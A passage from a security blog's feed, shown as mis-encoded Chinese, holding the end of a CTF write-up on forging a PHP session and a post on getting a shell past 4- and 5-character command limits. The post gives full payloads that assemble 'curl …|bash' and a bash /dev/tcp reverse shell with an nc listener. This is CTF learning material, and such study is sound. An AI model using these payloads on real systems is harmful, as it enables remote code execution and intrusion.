class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¼ªé€  session è®©è‡ªå·±å˜æˆ admin å¹¶ä¸”éœ€è¦åˆ›å»º success.txt æ–‡ä»¶</p><p>æˆ‘ä»¬å…ˆè¯»å–ä¸€ä¸‹ sessionï¼Œåä¸º sess_PHPSESSID çš„æ–‡ä»¶</p><img src="/2020/04/22/hfctf-web/get_sess.jpg"><p>å…¶å†…å®¹å¦‚ä¸‹</p><img src="/2020/04/22/hfctf-web/sess.jpg"><p>è¿™é‡Œè¦çŸ¥é“ PHP session åºåˆ—åŒ–çš„å½¢å¼ï¼ˆsession.serialize_handlerï¼‰</p><blockquote><p>php é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p><p>php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p><p>php_serializeï¼ˆ php &gt;= 5.5.4 ï¼‰ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</p></blockquote><p>ç”±äºæœ€å‰è¾¹æœ‰ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥åˆ¤æ–­è¿™é‡Œç”¨çš„æ˜¯ php_binary</p><p>æˆ‘ä»¬å‘ç°æœ€åä¸Šä¼ çš„æ–‡ä»¶åæ˜¯åŸæ–‡ä»¶å + â€˜_â€™ + æ–‡ä»¶åçš„ SHA256 å€¼ï¼Œä¸ session æ–‡ä»¶çš„æ–‡ä»¶åä¼¼ä¹æœ‰ç‚¹ç›¸ä¼¼</p><p>æ„é€ ä¸€ä¸ª php_binary å½¢å¼çš„ session æ–‡ä»¶ï¼Œusername ä¸º adminï¼Œæ³¨æ„å›¾ä¸­çš„ä¸å¯è§å­—ç¬¦ 08ï¼ˆæˆ–è€…ç”¨ PHP ç›´æ¥ç”Ÿæˆä¹Ÿå¯ä»¥</p><img src="/2020/04/22/hfctf-web/sess_file.jpg"><p>è®¡ç®—ä¸€ä¸‹è¯¥æ–‡ä»¶çš„ SHA256 å€¼</p><img src="/2020/04/22/hfctf-web/sess_sha256.jpg"><p>ä¸Šä¼ è¯¥ sess æ–‡ä»¶</p><img src="/2020/04/22/hfctf-web/upload.jpg"><p>ç„¶åå°† PHPSESSID æ”¹ä¸ºä¸Šé¢è®¡ç®—çš„ SHA256 å€¼å³å¯</p><p>ä¸‹ä¸€æ­¥å°±æ˜¯æ€ä¹ˆåˆ›å»º success.txtï¼Œç›´æ¥ä¸Šä¼ çš„è¯æ–‡ä»¶ååä¼šåŒ…å« SHA256 å€¼ï¼Œä½†æ˜¯æ ¹æ® file_exists çš„å‡½æ•°æè¿°ï¼Œå®ƒæ˜¯æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæˆ‘ä»¬ä¸å¥½ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥åˆ›å»ºç›®å½•</p><img src="/2020/04/22/hfctf-web/success.jpg"><p>åˆ·æ–°é¡µé¢å³å¯è·å¾— flag</p><h2 id="0x04-å®Œç»“æ’’èŠ±"><a href="#0x04-å®Œç»“æ’’èŠ±" class="headerlink" title="0x04 å®Œç»“æ’’èŠ±"></a>0x04 å®Œç»“æ’’èŠ±</h2><p>ä¸€å…±ä¸‰é“ WEB æœ‰ä¸¤é“ nodejs ç€å®æ²¡æƒ³åˆ°ï¼Œå¯¹ nodejs ä¸€ç‚¹éƒ½ä¸ç†Ÿæ‚‰ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¤ªèœäº†</p><p>ä»¥åè¦å¤šçœ‹çœ‹è¿™ä¸€ç±»çš„é¢˜ï¼Œè¦ä¸ç„¶æ¯”èµ›é‡åˆ°äº†æ— ä»ä¸‹æ‰‹å°±å¾ˆéš¾å—</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;å½“æ—¶æ¯”èµ›çš„æ—¶å€™ï¼Œä¸€å…±ä¸‰é“ WEB é¢˜ï¼Œä¸¤é“ nodejs çš„éƒ½ä¸ä¼šï¼Œè¿˜æœ‰ä¸€é“ PHP æ²¡æ¥å¾—åŠçœ‹åæ¥
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://x5tar.com/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://x5tar.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell</title>
    <link href="https://x5tar.com/2020/04/18/bypass-char-number-limit/"/>
    <id>https://x5tar.com/2020/04/18/bypass-char-number-limit/</id>
    <published>2020-04-18T04:56:22.000Z</published>
    <updated>2020-05-03T09:24:05.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¹‹å‰åšé¢˜æœ‰åšåˆ°è¿‡å­—æ•°é™åˆ¶çš„ shellï¼Œæœ‰äº”ä¸ªå­—ç¬¦ä¹Ÿæœ‰å››ä¸ªå­—ç¬¦çš„ï¼Œå½“ç„¶æˆ‘ä¸€ç›´ä¸ä¼šåšï¼Œæœ€è¿‘åˆé‡æ–°ç ”ç©¶äº†ä¸€ä¸‹è¿™ä¸ªç»•è¿‡çš„é—®é¢˜ï¼Œå°±æŠŠå®ƒè®°å½•ä¸‹æ¥äº†</p><p>è¿™ç§é¢˜ä¸€èˆ¬éƒ½æ˜¯æ¯äººä¸€ä¸ª sandbox ç›®å½•ï¼Œä¹‹åçš„æ“ä½œéƒ½åœ¨è¿™ä¸ªç›®å½•ä¸­è¿›è¡Œ</p><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><ol><li><p><code>ls</code> è¾“å‡ºçš„é»˜è®¤æ’åºæ˜¯é€å­—ç¬¦æŒ‰ç…§ ASCII ç ä»å°åˆ°å¤§æ’åº</p></li><li><p><code>ls -t</code> æ–‡ä»¶åæŒ‰æ—¶é—´æ’åº</p></li><li><p>é‡å®šå‘ç¬¦ <code>&gt;</code> æ— å‘½ä»¤ä¹Ÿå¯ç”¨äºåˆ›å»ºæ–‡ä»¶</p></li><li><p>IP çš„ç­‰ä»·è¡¨ç¤ºï¼ˆé€‰ç”¨ï¼Œæœ‰æ—¶å¯é™ä½éš¾åº¦ï¼‰</p><p>å°† <code>.</code> åˆ†éš”çš„æ¯ä¸ªåè¿›åˆ¶æ•°è½¬æ¢æˆä¸¤ä½åå…­è¿›åˆ¶å†è¿æ¥èµ·æ¥ï¼ˆå¯è½¬æ¢æˆåè¿›åˆ¶ã€å…«è¿›åˆ¶ç­‰ï¼‰ï¼Œå’ŒåŸ IP ç­‰ä»·ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="string">'172.17.0.1'</span></span><br><span class="line">hex_ip = <span class="string">'0x'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>):</span><br><span class="line">    hex_ip += str(hex(int(i)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">print(hex_ip) <span class="comment"># 0xac110001</span></span><br><span class="line">print(int(hex_ip, <span class="number">16</span>)) <span class="comment"># 2886795265</span></span><br><span class="line">print(<span class="string">'0'</span> + oct(int(hex_ip, <span class="number">16</span>))[<span class="number">2</span>:]) <span class="comment"># 025404200001</span></span><br></pre></td></tr></table></figure></li><li><p>å•ç‹¬çš„ <code>*</code> ç›¸å½“äº <code>`ls`</code> å³å°†æ–‡ä»¶åä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æ·»åŠ å…¶å®ƒå­—ç¬¦è¿›è¡ŒåŒ¹é…</p><img src="/2020/04/18/bypass-char-number-limit/star.jpg" title="star"><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ <code>dir</code> å’Œ <code>whoami</code> ï¼Œå•ç‹¬çš„ <code>*</code> æ‰§è¡Œäº† <code>dir whoami</code> å‘½ä»¤ï¼Œè€Œ <code>*i</code> æ‰§è¡Œäº† <code>whoami</code> å‘½ä»¤</p></li><li><p><code>dir</code> å‘½ä»¤æœ¬è´¨ä¸Šä¸ <code>ls</code> ç›¸åŒï¼Œä½†è¾“å‡ºä¸æ¢è¡Œï¼Œä¸”é¦–å­—æ¯ä¸º d å¯ä»¥æ“ä½œ</p></li><li><p><code>rev</code> å‘½ä»¤è¾“å‡ºåè½¬æ–‡ä»¶æ¯ä¸€è¡Œåçš„å†…å®¹</p><img src="/2020/04/18/bypass-char-number-limit/rev.jpg" title="rev"></li></ol><h2 id="0x02-5ä¸ªå­—ç¬¦"><a href="#0x02-5ä¸ªå­—ç¬¦" class="headerlink" title="0x02 5ä¸ªå­—ç¬¦"></a>0x02 5ä¸ªå­—ç¬¦</h2><p>å½“ç„¶å…ˆæ˜¯äº”ä¸ªå­—ç¬¦çš„ï¼Œç®€å•ä¸€ç‚¹</p><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/tmp/sandbox5/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span>.$sandbox.<span class="string">'/*'</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å¤§ä½“æ€è·¯å°±æ˜¯æŠŠ <code>curl ip|bash</code> åˆ†å‰²æˆä¸€ä¸ªä¸€ä¸ªå°å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨ç»“å°¾æ·»åŠ  <code>\</code> è¿æ¥ï¼Œå°†è¦æ‰§è¡Œçš„è„šæœ¬æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™å…¶ä¸­è¿˜è¦ç”¨åˆ° <code>ls -t</code> ï¼Œä¸ºäº†é˜²æ­¢ <code>.</code> çš„å¹²æ‰°é‡‡ç”¨åå…­è¿›åˆ¶è¡¨ç¤º IP (è¿™é‡Œéœ€è¦è‡ªå·±ç ”ç©¶æ€ä¹ˆåˆ†å‰²)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -t&gt;v</span></span><br><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;v</span><br><span class="line">ls&gt;&gt;_</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥)</span></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;01\\</span><br><span class="line">&gt;00\\</span><br><span class="line">&gt;11\\</span><br><span class="line">&gt;ac\\</span><br><span class="line">&gt;0x\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh _</span><br><span class="line">sh v</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ä¸­ <code>index.html</code> ä¸­æ”¾æœ‰åå¼¹ shell çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡å™¨ç›‘å¬ <code>12345</code> ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 12345</span><br></pre></td></tr></table></figure><p>æˆåŠŸåå¼¹ shell</p><h2 id="0x02-5-ä¸€ä¸ªæƒŠå–œçš„å‘ç°"><a href="#0x02-5-ä¸€ä¸ªæƒŠå–œçš„å‘ç°" class="headerlink" title="0x02.5 ä¸€ä¸ªæƒŠå–œçš„å‘ç°"></a>0x02.5 ä¸€ä¸ªæƒŠå–œçš„å‘ç°</h2><p>æˆ‘åœ¨åš 4 ä¸ªå­—ç¬¦çš„æµ‹è¯•æ—¶å‘ç°ï¼Œç”¨ php çš„ <code>exec</code> å‡½æ•°æ‰§è¡Œ shell å‘½ä»¤ï¼Œç»“å°¾çš„åæ–œæ å±…ç„¶ä¸éœ€è¦è½¬ä¹‰</p><p>å³ä¸Šä¸€é¢˜çš„ payload å¯ç®€åŒ–ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -t&gt;v</span></span><br><span class="line">&gt;ls\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;-t\</span><br><span class="line">&gt;\&gt;v</span><br><span class="line">ls&gt;&gt;_</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥)</span></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;1\|\</span><br><span class="line">&gt;000\</span><br><span class="line">&gt;c11\</span><br><span class="line">&gt;0xa\</span><br><span class="line">&gt;l\ \</span><br><span class="line">&gt;cur\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh _</span><br><span class="line">sh v</span><br></pre></td></tr></table></figure><p>ä¹ŸæˆåŠŸåå¼¹äº† shellï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ªä¾‹æˆ–è€…æ˜¯ php ç‰ˆæœ¬é—®é¢˜ï¼Œä½†æˆ‘åœ¨æ¥ä¸‹æ¥ 4 ä¸ªå­—ç¬¦çš„æ“ä½œä¸­ä½¿ç”¨åˆ°äº†è¿™ä¸ªç‰¹æ€§ï¼Œè¦æ˜¯æœ‰ dalao å‘ç°è¿™æ ·ä¸å¯è¡Œçƒ¦è¯·å‘ŠçŸ¥æˆ‘ï¼ˆå¦‚æœçœŸçš„æœ‰ dalao çœ‹çš„è¯</p><h2 id="0x03-4ä¸ªå­—ç¬¦"><a href="#0x03-4ä¸ªå­—ç¬¦" class="headerlink" title="0x03 4ä¸ªå­—ç¬¦"></a>0x03 4ä¸ªå­—ç¬¦</h2><p>è¿™æ‰æ˜¯é‡å¤´æˆï¼Œæ›¾ç»å·®ç‚¹æŠŠæˆ‘æè‡ªé—­çš„é¢˜ï¼Œæˆ‘ç»ˆäºåšå‡ºæ¥äº†</p><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/tmp/sandbox4/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span>.$sandbox.<span class="string">'/*'</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æ€è·¯ä¸ä¹‹å‰ç›¸åŒï¼Œä½†æ˜¯è¦å……åˆ†è¿ç”¨ <code>dir</code> å’Œ <code>rev</code> å‘½ä»¤ï¼Œå…ˆæ”¾ä¸€ä¸‹ payload å†è¿›è¡Œåˆ†æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -tk&gt;f</span></span><br><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;kt-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v <span class="comment"># è¿™é‡Œæ–‡ä»¶åä¸º v éå¸¸é‡è¦</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;g</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥)</span></span><br><span class="line">&gt;ash</span><br><span class="line">&gt;b\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;01\</span><br><span class="line">&gt;00\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;ac\</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh g</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡ç‚¹åˆ†æç¬¬ä¸€éƒ¨åˆ†ï¼Œæ€ä¹ˆå¥‡ç‰¹çš„æ„é€ å‡ºéœ€è¦çš„å‘½ä»¤</p><p>ç¬¬ä¸€æ­¥åˆ›å»ºåä¸º dir çš„æ–‡ä»¶ï¼Œç”±äº d çš„ ASCII ç è¾ƒå°ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨ç¬¬ä¸€éƒ¨åˆ†å°†å§‹ç»ˆä½äºç¬¬ä¸€ä½</p><p>ç¬¬äºŒä¸‰å››æ­¥åˆ†åˆ«åˆ›å»ºå¯¹åº”æ–‡ä»¶</p><p>ç¬¬äº”æ­¥ç”¨åˆ°äº†å•ç‹¬çš„ <code>*</code> è¿™é‡Œç›¸å½“äºæ‰§è¡Œäº† <code>`dir f&gt; kt- sl`&gt;v</code></p><p>è¿™ä¹‹åæ–‡ä»¶ v ä¸­çš„å†…å®¹ä¸º <code>f&gt; kt- sl</code></p><p>ç¬¬å…­æ­¥åˆ›å»ºåä¸º rev çš„æ–‡ä»¶</p><p>ç¬¬ä¸ƒæ­¥æ˜¯è¿™é‡Œæœ€é‡è¦çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å‰è¾¹çš„æ–‡ä»¶åä¸º v éå¸¸é‡è¦çš„åŸå› ï¼Œç”¨åˆ°äº† <code>*</code> ç¬¬äºŒç§ç”¨æ³•ï¼Œç›¸å½“äºæ‰§è¡Œäº† <code>`rev v`&gt;g</code> ï¼Œå³å°† v çš„å†…å®¹åè½¬å†™å…¥ g</p><p>è¿™ä¹‹åæ–‡ä»¶ g çš„å†…å®¹ä¸º <code>ls -kt &gt;f</code> ä¹‹åçš„å†…å®¹ä¸ 5 ä¸ªå­—ç¬¦çš„æ–¹æ³•ç›¸åŒ</p><p>è¿™é‡Œå†è§£é‡Šä¸¤ä¸ªåœ°æ–¹</p><ol><li><p>æ˜¯æ–‡ä»¶å f å¯ä»¥ä¿®æ”¹ï¼Œä½†è¦ä¿è¯å…¶ä½äºç¬¬äºŒä½</p></li><li><p>æ˜¯ <code>-tk</code> ä¸­çš„ k å¯¹è¾“å‡ºç»“æœæ²¡æœ‰å½±å“ï¼Œä½†æ§åˆ¶äº†è¯¥æ–‡ä»¶åœ¨è¾“å‡ºä¸­çš„ä½ç½®ï¼Œä¹Ÿå¯è¿›è¡Œä¿®æ”¹ï¼Œä½†è¦ä»æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹æ‰å¯ä»¥</p></li></ol><h2 id="0x04-åè®°"><a href="#0x04-åè®°" class="headerlink" title="0x04 åè®°"></a>0x04 åè®°</h2><p>å¥½ä¹…æ²¡å†™åšå®¢äº†ï¼Œåœ¨ npy çš„æé†’ä¸‹æ¥æ°´ä¸€ç¯‡åšå®¢ï¼Œä¹Ÿå½“åšä¸€ä¸ªç¬”è®°ï¼Œä¸‹æ¬¡é‡åˆ°è¿™ç§é¢˜æŸ¥è‡ªå·±åšå®¢å°±å¥½äº†</p><p>è¿™ä¸¤é“é¢˜çš„<a href="https://github.com/X5tar/bypass-char-number-limit" target="_blank" rel="noopener">æºç </a>æˆ‘æ”¾åˆ° GitHub äº†ï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ªæ–‡ä»¶åä¸º shell.php çš„ webshellï¼Œæ–¹ä¾¿ä»¥ www-data ç”¨æˆ·è¿›è¡Œä¸€äº›æ“ä½œï¼ˆå¥½åƒä¹Ÿæ²¡å¤šå¤§ç”¨</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰åšé¢˜æœ‰åšåˆ°è¿‡å­—æ•°é™åˆ¶çš„ shellï¼Œæœ‰äº”ä¸ªå­—ç¬¦ä¹Ÿæœ‰å››ä¸ªå­—ç¬¦çš„ï¼Œå½“ç„¶æˆ‘ä¸€ç›´ä¸ä¼šåšï¼Œæœ€è¿‘åˆé‡æ–°ç ”ç©¶äº†
      
    
    </summary>
    
    
      <category term="WEB" scheme="https://x5tar.com/categories/WEB/"/>
    
    
      <category term="WEBå®‰å…¨" scheme="https://x5tar.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
      <category term="getshell" scheme="https://x5tar.com/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>Git å­¦ä¹ ç¬”è®°</title>
    <link href="https://x5tar.com/2020/02/19/learn-git/"/>
    <id>https://x5tar.com/2020/02/19/learn-git/</id>
    <published>2020-02-19T09:10:16.000Z</published>
    <updated>2020-04-10T07:57:59.616Z</updated>
    
